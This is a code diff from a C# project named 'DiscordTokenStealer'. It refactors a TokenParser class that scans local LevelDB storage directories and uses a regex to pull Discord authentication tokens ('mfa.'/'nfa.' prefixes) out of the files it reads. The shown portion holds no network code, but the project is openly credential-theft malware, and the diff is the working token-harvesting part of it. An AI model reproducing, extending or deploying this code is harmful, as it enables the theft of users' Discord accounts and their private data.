@@ -2,11 +2,10 @@
 using System.Text.RegularExpressions;
 
 namespace DiscordTokenStealer.Discord;
-public class TokenParser
+public static class TokenParser
 {
     private static readonly Regex TokenRegex = new Regex("((?:mfa|nfa))[.](.*?)\"", RegexOptions.Compiled);
-
-    public static IEnumerable<string> ParseFrom(string directory, string searchPattern)
+    private static IEnumerable<string> ParseFrom(string directory, string searchPattern)
     {
         return Directory.GetFiles(directory, searchPattern).SelectMany(fileName => ParseTokens(File.ReadAllText(fileName)));
     }
@@ -19,7 +18,7 @@ public class TokenParser
     public static IEnumerable<string> ParseAll()
     {
         List<string> tokens = new();
-        foreach (TokenDirectoryProvider? provider in typeof(TokenDirectoryProvider).GetFields(BindingFlags.Static | BindingFlags.Public).Where(f => f.FieldType == typeof(TokenDirectoryProvider)).Select(f => (TokenDirectoryProvider?)f.GetValue(null)))
+        foreach (LevelDatabaseProvider? provider in typeof(LevelDatabaseProvider).GetFields(BindingFlags.Static | BindingFlags.Public).Where(f => f.FieldType == typeof(LevelDatabaseProvider)).Select(f => (LevelDatabaseProvider?) f.GetValue(null)))
         {
             if (provider is not { Exists: true })
             {
